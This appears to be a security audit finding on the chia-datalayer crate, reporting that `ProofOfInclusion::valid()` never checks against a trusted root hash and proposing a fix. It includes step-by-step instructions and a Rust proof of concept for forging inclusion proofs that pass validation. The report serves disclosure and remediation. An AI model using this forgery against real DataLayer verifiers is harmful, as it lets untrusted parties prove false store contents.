### Title
`ProofOfInclusion::valid()` Does Not Verify Against an External Root Hash, Enabling Forged Inclusion Proofs - (File: `crates/chia-datalayer/src/merkle/proof_of_inclusion.rs`)

### Summary
`ProofOfInclusion::valid()` only checks that the proof's internal hash chain is self-consistent. The final check `existing_hash == self.root_hash()` is tautologically true after the loop, because `existing_hash` is set to `calculated_hash` in each iteration, and `calculated_hash == layer.combined_hash` is enforced in the same loop. `root_hash()` returns `last.combined_hash`, which is the same value. Any attacker who can supply a `ProofOfInclusion` object (via the `Streamable` deserialization path or the Python binding) can forge a proof for any arbitrary key that passes `valid()`.

### Finding Description
In `proof_of_inclusion.rs`, `root_hash()` is defined as:

```rust
pub fn root_hash(&self) -> Hash {
    if let Some(last) = self.layers.last() {
        last.combined_hash   // ← returns the last layer's stored hash
    } else {
        self.node_hash
    }
}
```

And `valid()` is:

```rust
pub fn valid(&self) -> bool {
    let mut existing_hash = self.node_hash;
    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {   // ← sets existing_hash = combined_hash on pass
            return false;
        }
        existing_hash = calculated_hash;
    }
    existing_hash == self.root_hash()   // ← always true: existing_hash IS last.combined_hash
}
```

After the loop, `existing_hash` equals `last_layer.combined_hash` (enforced by the loop's early-return check). `self.root_hash()` also returns `last_layer.combined_hash`. The final comparison is therefore always `true` when the loop completes without returning `false`. The function never compares against any externally-known, trusted root hash.

`ProofOfInclusion` is a `Streamable` type exposed via Python bindings (`py_valid`, `py_root_hash`), meaning it is designed to be transmitted over the network and verified by remote parties.

**Forged proof construction (attacker-controlled input):**
1. Choose any `node_hash` (the leaf hash the attacker wants to claim is included).
2. Choose any `other_hash` and `other_hash_side`.
3. Compute `combined_hash = calculate_internal_hash(node_hash, other_hash_side, other_hash)`.
4. Construct `ProofOfInclusion { node_hash, layers: [ProofOfInclusionLayer { other_hash_side, other_hash, combined_hash }] }`.
5. `proof.valid()` returns `true`. The `proof.root_hash()` is the attacker-chosen `combined_hash`, not any real tree root.

### Impact Explanation
Any Python or Rust caller that uses `proof.valid()` as the sole check for DataLayer inclusion accepts forged proofs. An attacker can prove that any arbitrary key-value pair is included in a DataLayer store, regardless of the actual committed tree root. This allows untrusted input to prove invalid state — matching the allowed High impact: "DataLayer Merkle proof/blob/delta logic accepts forged inclusion/exclusion, corrupts tree roots, or lets untrusted input prove invalid state."

### Likelihood Explanation
The method is named `valid()` and is the natural, idiomatic API for proof verification. The Python type stub (`datalayer.pyi`) exposes `valid() -> bool` and `root_hash() -> bytes32` as separate methods with no documentation indicating that callers must additionally compare `root_hash()` against a trusted value. Callers who rely solely on `proof.valid()` — a reasonable assumption given the method name — are vulnerable. The `Streamable` trait makes the type trivially deserializable from untrusted network bytes.

### Recommendation
`valid()` must accept a trusted root hash parameter and compare against it:

```rust
pub fn valid(&self, trusted_root: &Hash) -> bool {
    let mut existing_hash = self.node_hash;
    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;
    }
    &existing_hash == trusted_root   // ← compare against externally-known root
}
```

Alternatively, keep the current signature but rename it to `is_internally_consistent()` and add a separate `verify(trusted_root: &Hash) -> bool` method. Update the Python binding accordingly. Add a test that demonstrates a forged proof is rejected when the root is checked.

use chia_protocol::Bytes32;

fn forge_proof(fake_node_hash: Hash) -> ProofOfInclusion {
    let other_hash = Hash(Bytes32::new([0xAB; 32]));
    let other_hash_side = Side::Right;
    // attacker computes a self-consistent combined_hash
    let combined_hash = calculate_internal_hash(&fake_node_hash, other_hash_side, &other_hash);
    ProofOfInclusion {
        node_hash: fake_node_hash,
        layers: vec![ProofOfInclusionLayer {
            other_hash_side,
            other_hash,
            combined_hash,
        }],
    }
}

fn main() {
    // Claim that an arbitrary hash is "included" in the tree
    let fake_leaf = Hash(Bytes32::new([0xFF; 32]));
    let proof = forge_proof(fake_leaf);
    // valid() returns true for a completely fabricated proof
    assert!(proof.valid(), "forged proof accepted");
    println!("Forged proof passes valid(): root_hash = {:?}", proof.root_hash());
}
